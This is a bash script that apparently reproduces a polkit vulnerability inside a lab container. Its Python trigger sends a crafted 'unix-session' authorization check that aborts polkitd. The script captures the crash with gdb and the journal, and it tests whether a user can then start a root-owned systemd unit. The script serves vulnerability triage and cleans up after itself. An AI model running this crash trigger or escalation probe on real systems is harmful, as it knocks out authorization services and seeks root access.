#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/polkit-unix-session-abrt-triage-20260517.out"

mkdir -p "$repo_dir/logs"
tmp_log="$(mktemp "$repo_dir/logs/polkit-unix-session-abrt-triage-20260517.out.tmp.XXXXXX")"

docker exec -i "$container" bash -s >"$tmp_log" 2>&1 <<'TARGET'
set +e
export LC_ALL=C

WORK=/tmp/polkit-unix-session-abrt-triage
MARKER=/root/polkit_unix_session_abrt_triage_root
UNIT=/run/systemd/system/polkit-unix-session-abrt-triage-marker.service
SELF=selfauth
TTYNUM=8
PROFILE=/home/selfauth/.bash_profile
PROFILE_BAK=$WORK/selfauth.bash_profile.bak
PROFILE_STATE=$WORK/selfauth.bash_profile.state
GDB_PID=

section() {
  printf '\n## %s\n' "$1"
}

cleanup_target() {
  set +e
  if [ -n "${GDB_PID:-}" ]; then
    kill "$GDB_PID" >/dev/null 2>&1 || true
    wait "$GDB_PID" 2>/dev/null || true
  fi
  systemctl restart polkit.service >/dev/null 2>&1 || true
  if [ -f "$PROFILE_STATE" ] && grep -qx existed "$PROFILE_STATE"; then
    cp -a "$PROFILE_BAK" "$PROFILE" 2>/dev/null || true
    chown "$SELF:$SELF" "$PROFILE" 2>/dev/null || true
  else
    rm -f "$PROFILE"
  fi
  loginctl terminate-user "$SELF" >/dev/null 2>&1 || true
  rm -f "$UNIT" "$MARKER"
  systemctl daemon-reload >/dev/null 2>&1 || true
  rm -rf "$WORK"
  systemctl reset-failed >/dev/null 2>&1 || true
}
trap cleanup_target EXIT

rm -rf "$WORK"
mkdir -m 1777 -p "$WORK"
rm -f "$MARKER" "$UNIT"
systemctl restart polkit.service >/dev/null 2>&1 || true

if ! id "$SELF" >/dev/null 2>&1; then
  useradd -m -s /bin/bash "$SELF"
fi
usermod -G "$SELF" "$SELF"

if [ -e "$PROFILE" ]; then
  cp -a "$PROFILE" "$PROFILE_BAK"
  echo existed >"$PROFILE_STATE"
else
  echo absent >"$PROFILE_STATE"
fi

cat >"$UNIT" <<'UNITEOF'
[Service]
Type=oneshot
ExecStart=/bin/sh -c 'id > /root/polkit_unix_session_abrt_triage_root'
UNITEOF
systemctl daemon-reload >/dev/null 2>&1 || true

section "target baseline and default reachability"
{
  sed -n '1,8p' /etc/os-release
  uname -a
  systemctl is-system-running
  id attacker
  id "$SELF"
  passwd -S attacker
  passwd -S "$SELF"
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
    polkitd libpolkit-gobject-1-0 libpolkit-agent-1-0 dbus systemd login passwd python3-dbus gdb \
    2>&1 | sort
  echo "core_pattern=$(cat /proc/sys/kernel/core_pattern 2>/dev/null)"
  echo "suid_dumpable=$(cat /proc/sys/fs/suid_dumpable 2>/dev/null)"
  systemctl cat polkit.service
  busctl --system introspect org.freedesktop.PolicyKit1 /org/freedesktop/PolicyKit1/Authority org.freedesktop.PolicyKit1.Authority --no-pager
} 2>&1

section "ubuntu source snippets"
{
  echo "Source package fetch is analysis tooling only; installed runtime package proof is above."
  srcdir="$WORK/source"
  rm -rf "$srcdir"
  mkdir -p "$srcdir"
  cd "$srcdir" || exit 0
  apt-get source -qq policykit-1=124-2ubuntu1.24.04.3 >"$srcdir/source-fetch.log" 2>&1
  echo "apt_get_source_rc=$?"
  sed -n '1,80p' "$srcdir/source-fetch.log"
  if [ -d "$srcdir/policykit-1-124" ]; then
    cd "$srcdir/policykit-1-124" || exit 0
    echo "--- src/polkit/polkitsubject.c:485-498 parses client-supplied unix-session ---"
    nl -ba src/polkit/polkitsubject.c | sed -n '485,498p'
    echo "--- src/polkitbackend/polkitbackendauthority.c:736-798 handles CheckAuthorization ---"
    nl -ba src/polkitbackend/polkitbackendauthority.c | sed -n '736,798p'
    echo "--- src/polkitbackend/polkitbackendinteractiveauthority.c:920-999 validates caller then checks subject ---"
    nl -ba src/polkitbackend/polkitbackendinteractiveauthority.c | sed -n '920,999p'
    echo "--- src/polkitbackend/polkitbackendinteractiveauthority.c:1131-1158 asks for subject session ---"
    nl -ba src/polkitbackend/polkitbackendinteractiveauthority.c | sed -n '1131,1158p'
    echo "--- src/polkitbackend/polkitbackendsessionmonitor-systemd.c:306-321 resolves unix-session user ---"
    nl -ba src/polkitbackend/polkitbackendsessionmonitor-systemd.c | sed -n '306,321p'
    echo "--- src/polkitbackend/polkitbackendsessionmonitor-systemd.c:358-392 unsupported unix-session falls into assert ---"
    nl -ba src/polkitbackend/polkitbackendsessionmonitor-systemd.c | sed -n '358,392p'
  fi
} 2>&1

cat >"$WORK/min_trigger.py" <<'PY'
#!/usr/bin/python3
import os
import dbus

def start_time(pid):
    with open(f"/proc/{pid}/stat") as f:
        return int(f.read().split()[21])

def check(label, subject, action):
    bus = dbus.SystemBus()
    authority = bus.get_object("org.freedesktop.PolicyKit1", "/org/freedesktop/PolicyKit1/Authority")
    iface = dbus.Interface(authority, "org.freedesktop.PolicyKit1.Authority")
    details = dbus.Dictionary({}, signature="ss")
    try:
        result = iface.CheckAuthorization(subject, action, details, dbus.UInt32(0), f"polkit-unix-session-abrt-{label}")
        print(f"{label}: authorized={bool(result[0])} challenge={bool(result[1])} details={dict(result[2])}", flush=True)
    except Exception as exc:
        print(f"{label}: EXC {type(exc).__name__}: {exc}", flush=True)

sid = os.environ.get("XDG_SESSION_ID")
print(f"TRIGGER uid={os.getuid()} gid={os.getgid()} pid={os.getpid()} sid={sid!r}", flush=True)

own_process = ("unix-process", {
    "pid": dbus.UInt32(os.getpid()),
    "start-time": dbus.UInt64(start_time(os.getpid())),
    "uid": dbus.Int32(os.getuid()),
})
check("control-own-unix-process", own_process, "org.freedesktop.login1.set-self-linger")

unix_session = ("unix-session", {"session-id": dbus.String(sid or "")})
check("crash-actual-unix-session", unix_session, "org.freedesktop.login1.set-self-linger")
PY
chmod 0755 "$WORK/min_trigger.py"
chown "$SELF:$SELF" "$WORK/min_trigger.py"

cat >"$WORK/active.sh" <<'SH'
#!/usr/bin/env bash
set +e
export LC_ALL=C
{
  echo "ACTIVE_IDENTITY"
  id
  tty
  echo "XDG_SESSION_ID=${XDG_SESSION_ID:-}"
  loginctl show-session "${XDG_SESSION_ID:-}" -p Id -p User -p Name -p Seat -p TTY -p Type -p Remote -p Active -p State 2>&1
  /tmp/polkit-unix-session-abrt-triage/min_trigger.py
  echo "POST_CRASH_ROOT_ACTION_ATTEMPT"
  busctl --system call org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager StartUnit ss polkit-unix-session-abrt-triage-marker.service replace 2>&1
} > /tmp/polkit-unix-session-abrt-triage/active.out 2>&1
SH
chmod 0755 "$WORK/active.sh"
chown "$SELF:$SELF" "$WORK/active.sh"

cat >"$PROFILE" <<'SH'
/tmp/polkit-unix-session-abrt-triage/active.sh
exit
SH
chown "$SELF:$SELF" "$PROFILE"

run_active_trigger() {
  local label="$1"
  rm -f "$WORK/active.out" "$WORK/openvt-$label.out" "$WORK/openvt-$label.rc"
  timeout 90 openvt -c "$TTYNUM" -s -f -w -- /bin/login -f "$SELF" >"$WORK/openvt-$label.out" 2>&1
  echo "$?" >"$WORK/openvt-$label.rc"
  echo "--- openvt $label rc/output ---"
  cat "$WORK/openvt-$label.rc" "$WORK/openvt-$label.out" 2>&1
  echo "--- active $label output ---"
  sed -n '1,140p' "$WORK/active.out" 2>&1
}

section "gdb-attached crash reproduction"
{
  systemctl restart polkit.service >/dev/null 2>&1 || true
  service_pid="$(systemctl show -p MainPID --value polkit.service)"
  echo "polkit_service_pid=$service_pid"
  gdb -q -batch -p "$service_pid" \
    -ex "set debuginfod enabled off" \
    -ex "set pagination off" \
    -ex "handle SIGABRT stop print nopass" \
    -ex "continue" \
    -ex "bt full" \
    -ex "thread apply all bt" \
    >"$WORK/gdb.out" 2>&1 &
  GDB_PID=$!
  sleep 2
  run_active_trigger gdb
  for _ in $(seq 1 80); do
    kill -0 "$GDB_PID" >/dev/null 2>&1 || break
    sleep 0.25
  done
  kill "$GDB_PID" >/dev/null 2>&1 || true
  wait "$GDB_PID" 2>/dev/null || true
  GDB_PID=
  echo "--- gdb backtrace ---"
  sed -n '1,260p' "$WORK/gdb.out" 2>&1
  echo "--- root marker after gdb trigger ---"
  ls -l "$MARKER" 2>&1 || true
  [ -e "$MARKER" ] && cat "$MARKER" || true
} 2>&1

section "systemd-managed crash and journal reproduction"
{
  start_ts="$(date -u '+%Y-%m-%d %H:%M:%S UTC')"
  systemctl restart polkit.service >/dev/null 2>&1 || true
  before_pid="$(systemctl show -p MainPID --value polkit.service)"
  echo "before_polkit_pid=$before_pid"
  run_active_trigger journal
  sleep 1
  after_pid="$(systemctl show -p MainPID --value polkit.service)"
  echo "after_polkit_pid=$after_pid"
  echo "--- polkit journal since $start_ts ---"
  journalctl -u polkit.service --since "$start_ts" --no-pager -o short-precise | sed -n '1,160p'
  echo "--- root marker after journal trigger ---"
  ls -l "$MARKER" 2>&1 || true
  [ -e "$MARKER" ] && cat "$MARKER" || true
  echo "--- attacker root action after restart ---"
  timeout 8 runuser -u attacker -- busctl --system call org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager StartUnit ss polkit-unix-session-abrt-triage-marker.service replace 2>&1
  echo "attacker_startunit_rc=$?"
  ls -l "$MARKER" 2>&1 || true
} 2>&1

section "final cleanup and health"
{
  cleanup_target
  trap - EXIT
  systemctl is-system-running
  systemctl --failed --no-legend
  systemctl is-active polkit.service
  ls -ld "$WORK" 2>&1 || true
  ls -l "$UNIT" "$MARKER" 2>&1 || true
  if [ -e "$PROFILE" ]; then
    echo "selfauth_profile_present"
  else
    echo "selfauth_profile_absent"
  fi
  pgrep -af 'gdb|polkit-unix-session-abrt-triage' || true
} 2>&1
TARGET

mv "$tmp_log" "$log_path"
printf '%s\n' "$log_path"
